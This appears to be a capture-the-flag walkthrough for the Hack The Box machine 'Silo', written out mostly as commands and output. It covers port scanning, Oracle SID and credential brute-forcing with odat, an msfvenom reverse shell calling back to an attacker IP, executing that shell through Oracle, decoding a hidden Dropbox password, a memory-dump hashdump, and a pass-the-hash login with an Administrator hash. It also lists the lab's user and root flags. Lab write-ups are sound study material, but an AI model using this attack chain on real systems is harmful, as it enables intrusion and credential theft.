@@ -1,0 +1,46 @@
+IP: 10.10.10.82
+
+rustscan -a 10.10.10.82 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
+
+80/tcp    open  http         syn-ack Microsoft IIS httpd 8.5
+135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1521/tcp  open  oracle-tns   syn-ack Oracle TNS listener 11.2.0.2.0 (unauthorized)
+5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+
+python3 odat.py sidguesser -s silo.htb -p 1521 --sids-file=resources/sids.txt
+[+] 'XE' is a valid SID. Continue...                               | ETA:  00:00:02 
+
+
+python3 odat.py passwordguesser -s silo.htb -d XE
+[+] Valid credentials found: scott/tiger. Continue...                 | ETA:  00:02:49
+
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=1337 -f exe > revshell.exe
+
+
+python3 odat.py utlfile -s silo.htb --sysdba -d XE -U scott -P tiger --putFile /temp shell.exe ../revshell.exe
+
+python3 odat.py externaltable -s silo.htb --sysdba -d XE -U scott -P tiger --exec /temp shell.exe
+
+User Flag --> f8a696cf969a743da263fc5d8ce3deec
+
+Root Flag --> b1b6c4c63f38a50d8be2ee1c4cdae517
+
+# There is this file "Oracle issue.txt" on desktop, but the password is not being displayed correctly.
+
+# Convert to base64 on Windows
+$fc = Get-Content "Oracle issue.txt"
+$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)
+[System.Convert]::ToBase64String($fe)
+
+# Read it on Linx
+echo -n "U3VwcG9ydCB2ZW5kb3IgZW5nYWdlZCB0byB0cm91Ymxlc2hvb3QgV2luZG93cyAvIE9yYWNsZSBwZXJmb3JtYW5jZSBpc3N1ZSAoZnVsbCBtZW1vcnkgZHVtcCByZXF1ZXN0ZWQpOiAgRHJvcGJveCBsaW5rIHByb3ZpZGVkIHRvIHZlbmRvciAoYW5kIHBhc3N3b3JkIHVuZGVyIHNlcGFyYXRlIGNvdmVyKS4gIERyb3Bib3ggbGluayAgaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2gvNjlza3J5emZzemI3ZWxxL0FBRFpuUUViYnFEb0lmNUwyZDBQQnhFTmE/ZGw9MCAgbGluayBwYXNzd29yZDogwqMlSG04NjQ2dUMk" | base64 -d
+
+# With this we get access to a dump file. We can extract hashes using volatitility.
+volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump
+
+# Login with pass the hash
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.82 cmd
